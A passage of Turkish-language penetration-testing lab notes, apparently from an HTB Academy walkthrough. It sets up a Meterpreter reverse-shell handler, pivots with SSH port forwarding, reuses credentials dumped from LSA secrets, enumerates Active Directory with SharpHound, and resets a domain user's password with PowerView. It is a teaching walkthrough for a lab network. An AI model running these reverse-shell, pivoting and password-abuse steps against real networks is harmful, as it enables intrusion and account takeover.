[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost 0.0.0.0
lhost => 0.0.0.0
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lport 7000
lport => 7000
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

[*] Started HTTPS reverse handler on https://0.0.0.0:7000
```

Daha sonra, teams.exe reverse shell payload'unu DEV01 hedef hostuna yüklememiz gerekiyor. SCP ile dmz01'e yükleyebilir, bu hostta bir Python web sunucusu başlatabilir ve ardından dosyayı indirebiliriz. Alternatif olarak, daha önce yaptığımız gibi dosyayı yüklemek için DNN dosya yöneticisini kullanabiliriz. Hedefteki payload ile, dmz01 pivot kutusunun 443 numaralı portunu Metasploit dinleyici portu 7000'e yönlendirmek için SSH remote port forwarding'i ayarlamamız gerekir. R bayrağı, pivot host'a 443 numaralı portu dinlemesini ve bu porta gelen tüm trafiği saldırı host'umuzda yapılandırılmış 0.0.0.0:7000 adresindeki Metasploit dinleyicimize iletmesini söyler.


```shell-session
M1R4CKCK@htb[/htb]$ ssh -i dmz01_key -R 172.16.8.120:443:0.0.0.0:7000 root@10.129.203.111 -vN

OpenSSH_8.4p1 Debian-5, OpenSSL 1.1.1n  15 Mar 2022
debug1: Reading configuration data /etc/ssh/ssh_config
debug1: /etc/ssh/ssh_config line 19: include /etc/ssh/ssh_config.d/*.conf matched no files
debug1: /etc/ssh/ssh_config line 21: Applying options for *
debug1: Connecting to 10.129.203.111 [10.129.203.111] port 22.

<SNIP>

debug1: Authentication succeeded (publickey).
Authenticated to 10.129.203.111 ([10.129.203.111]:22).
debug1: Remote connections from 172.16.8.120:443 forwarded to local address 0.0.0.0:7000
debug1: Requesting no-more-sessions@openssh.com
debug1: Entering interactive session.
debug1: pledge: network
debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0
debug1: Remote: /root/.ssh/authorized_keys:1: key options: agent-forwarding port-forwarding pty user-rc x11-forwarding
debug1: Remote: /root/.ssh/authorized_keys:1: key options: agent-forwarding port-forwarding pty user-rc x11-forwarding
debug1: Remote: Forwarding listen address "172.16.8.120" overridden by server GatewayPorts
debug1: remote forward success for: listen 172.16.8.120:443, connect 0.0.0.0:7000
```


Ardından, DEV01 hostundan teams.exe payload'unu çalıştırın ve her şey plana uygun giderse, bir bağlantı geri alacağız.

```shell-session
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> exploit

[*] Started reverse TCP handler on 0.0.0.0:7000 
[*] Sending stage (175174 bytes) to 127.0.0.1
[*] Meterpreter session 2 opened (127.0.0.1:7000 -> 127.0.0.1:51146 ) at 2022-06-22 12:21:25 -0400

(Meterpreter 2)(c:\windows\system32\inetsrv) > getuid
Server username: IIS APPPOOL\DotNetNukeAppPool
```

Yukarıdaki yönteme ilişkin bir uyarı, varsayılan olarak **OpenSSH**'in remote  yönlendirilmiş portlara yalnızca sunucunun kendisinden (**localhost**) bağlantıya izin vermesidir. Bunu değiştirmek için, **Ubuntu** sistemlerinde **/etc/ssh/sshd_config** dosyasını düzenlememiz ve **GatewayPorts no** satırını **GatewayPorts yes** olarak değiştirmemiz gerekir; aksi takdirde, **SSH** komutunda yönlendirdiğimiz porta (bizim durumumuzda port **443**) geri dönüş bağlantısı alamayız.

Bu değişikliği yapmak için, pivot işlemi yapmak için kullandığımız hosta **root** SSH erişimine ihtiyacımız olacaktır. Bazı durumlarda bu yapılandırma zaten bu şekilde ayarlanmış olabilir ve hemen çalışabilir; ancak, eğer SSH yapılandırma dosyasını geçici olarak değiştirme ve ardından etkili olması için **service sshd reload** komutuyla yeniden yükleme yetkisine sahip **root** erişimimiz yoksa, bu yöntemi kullanarak port yönlendirme yapamayız.

Bu tür bir değişikliğin, müşterinin sisteminde bir güvenlik açığı yaratabileceğini unutmayın. Bu nedenle, değişikliği uygulamadan önce onay almanız, yapılan değişikliği not almanız ve testlerin sonunda bunu geri almanız önemlidir. SSH **Remote Forwarding** kavramını daha iyi anlamak için bu konudaki [makaleyi](https://www.ssh.com/academy/ssh/tunneling/example) okumak faydalı olacaktır.

### İyi Bir Başlangıç
İlk hostumuza saldıran iç ağı numaralandırdığımıza, ayrıcalıkları yükselttiğimize, post-exploitation gerçekleştirdiğimize ve iç ağı değerlendirmek için pivotlarımızı/çoklu yollarımızı ayarladığımıza göre, şimdi dikkatimizi AD ortamına çevirelim. Elimizde bir dizi kimlik bilgisi olduğuna göre, daha iyi bir bilgi edinmek ve Domain Admin'e giden yolları aramak için her türlü numaralandırma işlemini gerçekleştirebiliriz.



# Lateral Movement

DEV01 hostunu yağmaladıktan sonra, LSA secret'larını dump ederek aşağıdaki kimlik bilgilerini bulduk:

hporter:Gr8hambino!

Active Directory Enumeration & Attacks modülü, bir Windows hostundan AD'yi numaralandırmanın çeşitli yollarını göstermektedir. Kancalarımızı DEV01'in derinliklerine soktuğumuzdan, daha fazla saldırı başlatmak için burayı hazırlama alanımız olarak kullanabiliriz. Şimdilik PrintSpoofer'dan yararlandıktan sonra dmz01 hostunda yakaladığımız reverse shell'i kullanacağız çünkü oldukça kararlı. Daha sonraki bir noktada, bazı ek “port yönlendirme jimnastiği” yapmak ve RDP veya WinRM üzerinden bağlanmak isteyebiliriz, ancak bu shell yeterli olacaktır.

Tüm olası AD nesnelerini listelemek için SharpHound collector'ı kullanacağız ve ardından verileri inceleme için BloodHound GUI'ye alacağız. Yürütülebilir dosyayı indirebilir (ancak gerçek dünya değerlendirmesinde kendi araçlarımızı derlemek en iyisidir) ve hedefe yüklemek için kullanışlı DNN dosya yöneticisini kullanabiliriz. Mümkün olduğunca çok veri toplamak istiyoruz ve evasion konusunda endişelenmemize gerek yok, bu nedenle tüm toplama yöntemlerini kullanmak için  -c All bayrağını kullanacağız.

```cmd-session
c:\DotNetNuke\Portals\0> SharpHound.exe -c All

2022-06-22T10:02:32.2363320-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-06-22T10:02:32.2519575-07:00|INFORMATION|Initializing SharpHound at 10:02 AM on 6/22/2022
2022-06-22T10:02:32.5800848-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-06-22T10:02:32.7675820-07:00|INFORMATION|Beginning LDAP search for INLANEFREIGHT.LOCAL
2022-06-22T10:03:03.3301538-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 46 MB RAM
2022-06-22T10:03:16.9238698-07:00|WARNING|[CommonLib LDAPUtils]Error getting forest, ENTDC sid is likely incorrect
2022-06-22T10:03:18.1426009-07:00|INFORMATION|Producer has finished, closing LDAP channel
2022-06-22T10:03:18.1582366-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2022-06-22T10:03:18.6738528-07:00|INFORMATION|Consumers finished, closing output channel
2022-06-22T10:03:18.7050961-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2022-06-22T10:03:18.8769905-07:00|INFORMATION|Status: 3641 objects finished (+3641 79.15218)/s -- Using 76 MB RAM
2022-06-22T10:03:18.8769905-07:00|INFORMATION|Enumeration finished in 00:00:46.1149865
2022-06-22T10:03:19.1582443-07:00|INFORMATION|SharpHound Enumeration Completed at 10:03 AM on 6/22/2022! Happy Graphing!
```

Bu, DNN file management tool aracılığıyla tekrar indirebileceğimiz düzenli bir Zip dosyası oluşturacaktır (çok kullanışlı!). Ardından, neo4j servisini başlatabilir (sudo neo4j start), GUI aracını açmak için bloodhound yazabilir ve verileri alabiliriz.

hporter kullanıcımızı arayıp First Degree Object Control'ü seçerek, kullanıcının ssmalls kullanıcısı üzerinde ForceChangePassword haklarına sahip olduğunu görebiliriz.

![Pasted image 20250101040414.png](/img/user/resimler/Pasted%20image%2020250101040414.png)

Bir kenara, tüm Domain Kullanıcılarının DEV01 hostu üzerinden RDP erişimine sahip olduğunu görebiliriz. Bu, domain'deki herhangi bir kullanıcının RDP'ye erişebileceği ve ayrıcalıkları yükseltebilirse kimlik bilgileri gibi hassas verileri çalabileceği anlamına gelir. Bu bir bulgu olarak kayda değerdir; buna Aşırı Active Directory Group Privileges diyebilir ve orta riskli olarak etiketleyebiliriz. Eğer tüm grup bir host üzerinde local admin haklarına sahipse, bu kesinlikle yüksek riskli bir bulgu olacaktır.

![Pasted image 20250101040554.png](/img/user/resimler/Pasted%20image%2020250101040554.png)

ssmalls kullanıcısının parolasını değiştirmek için PowerView'i kullanabiliriz. Portun açık olduğundan emin olmak için kontrol ettikten sonra hedefe RDP yapalım. RDP, bir PowerShell konsolu aracılığıyla domain ile etkileşime girmemizi kolaylaştıracaktır, ancak bunu yine de reverse shell erişimimiz aracılığıyla yapabiliriz.

```shell-session
M1R4CKCK@htb[/htb]$ proxychains nmap -sT -p 3389 172.16.8.20

ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-22 13:35 EDT
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.20:80-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.20:3389-<><>-OK
Nmap scan report for 172.16.8.20
Host is up (0.11s latency).

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 0.30 seconds 
```

Bunu başarmak için, başka bir SSH port yönlendirme komutu kullanabiliriz, bu tür Local Port Forwarding. Komut, tüm RDP trafiğini 13389 numaralı local port üzerinden dmz01 host'u aracılığıyla DEV01'e aktarmamızı sağlar.

```shell-session
ssh -i dmz01_key -L 13389:172.16.8.20:3389 root@10.129.203.111
```

Bu port yönlendirmesi kurulduktan sonra, dosyaları kolayca ileri geri aktarmak için sürücü yönlendirmesini kullanarak host'a bağlanmak için xfreerdp'yi kullanabiliriz.

```shell-session
xfreerdp /v:127.0.0.1:13389 /u:hporter /p:Gr8hambino! /drive:home,"/home/tester/tools"
```

Bu sunucuda Desktop Experience rolü yüklü olmadığı için yalnızca konsol erişimi elde ettiğimizi fark ettik, ancak tek ihtiyacımız olan bir konsol. Yeniden yönlendirilen sürücümüzün konumunu görüntülemek için net use yazabilir ve ardından aracı aktarabiliriz.

```cmd-session
c:\DotNetNuke\Portals\0> net use

New connections will be remembered.


Status       Local     Remote                    Network

-------------------------------------------------------------------------------
                       \\TSCLIENT\home           Microsoft Terminal Services
The command completed successfully.


c:\DotNetNuke\Portals\0> copy \\TSCLIENT\home\PowerView.ps1 .
        1 file(s) copied.
```

Ardından, bir PowerShell konsoluna girmek için powershell yazın ve ssmalls kullanıcısının parolasını değiştirmek için PowerView'u aşağıdaki gibi kullanabiliriz:

```powershell-session
PS C:\DotNetNuke\Portals\0> Import-Module .\PowerView.ps1

PS C:\DotNetNuke\Portals\0> Set-DomainUserPassword -Identity ssmalls -AccountPassword (ConvertTo-SecureString 'Str0ngpass86!' -AsPlainText -Force ) -Verbose

VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'ssmalls'
VERBOSE: [Set-DomainUserPassword] Password for user 'ssmalls' successfully reset
```

Saldırı hostumuza geri dönebilir ve şifrenin başarıyla değiştirildiğini onaylayabiliriz. Genel olarak, bir sızma testi sırasında bu tür faaliyetlerden kaçınmak isteriz, ancak tek yolumuz buysa, müşterimizle teyit etmeliyiz. Çoğu, yolun bizi nereye kadar götüreceğini görebilmek için devam etmemizi isteyecektir, ancak sormak her zaman en iyisidir. Elbette bu gibi değişiklikleri faaliyet günlüğümüze not etmek isteriz, böylece raporumuzun bir ekine dahil edebiliriz.

```shell-session
M1R4CKCK@htb[/htb]$ proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86!

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:135-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
SMB         172.16.8.3      445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\ssmalls:Str0ngpass86!
```
